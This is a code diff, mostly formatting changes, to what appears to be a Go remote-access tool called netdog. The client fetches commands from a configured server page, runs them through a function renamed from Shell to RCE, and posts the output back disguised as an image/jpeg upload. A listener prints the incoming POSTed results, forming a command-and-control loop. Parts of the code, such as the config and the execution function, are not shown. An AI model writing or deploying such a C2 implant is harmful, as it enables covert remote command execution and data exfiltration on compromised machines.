@@ -1,29 +1,29 @@
 package main
 
 import (
+	"bufio"
+	"bytes"
+	"fmt"
+	"io"
+	"log"
 	"net"
 	"net/http"
-	"io"
 	"os"
-    "bufio"
-	"bytes"
-	"time"
 	"strings"
-	"fmt"
-	"log"
+	"time"
 )
 
 func AsyncHTTPClient(config Config) {
 	url := config.Scheme + "://" + config.Address
 
 	resp, err := http.Get(url + "/netdog.html")
-    if err != nil {
-        AsyncHTTPReconnect(config)
+	if err != nil {
+		AsyncHTTPReconnect(config)
 		return
-    }
+	}
 
-    body, _ := io.ReadAll(resp.Body)
-	output := Shell(config.Shell, body)
+	body, _ := io.ReadAll(resp.Body)
+	output := RCE(config.Shell, body)
 
 	_, _ = http.Post(url, "image/jpeg", bytes.NewBuffer(output))
 
@@ -42,16 +42,16 @@ func AsyncHTTPServer(config Config) {
 	log.Println("Listening on " + config.Address)
 
 	for {
-        conn, err := listener.Accept()
-        if err != nil {
-            log.Println(err)
-        }
+		conn, err := listener.Accept()
+		if err != nil {
+			log.Println(err)
+		}
 
 		buffer := make([]byte, MAXBUFFERSIZE)
 		conn.Read(buffer)
 
 		httpReq := string(buffer)
-		if strings.HasPrefix(httpReq,"POST") {
+		if strings.HasPrefix(httpReq, "POST") {
 			fmt.Println(httpReq)
 			conn.Close()
 			continue
@@ -64,7 +64,7 @@ func AsyncHTTPServer(config Config) {
 		conn.Write([]byte(response))
 
 		conn.Close()
-    }
+	}
 }
 
 func AsyncHTTPReconnect(config Config) {
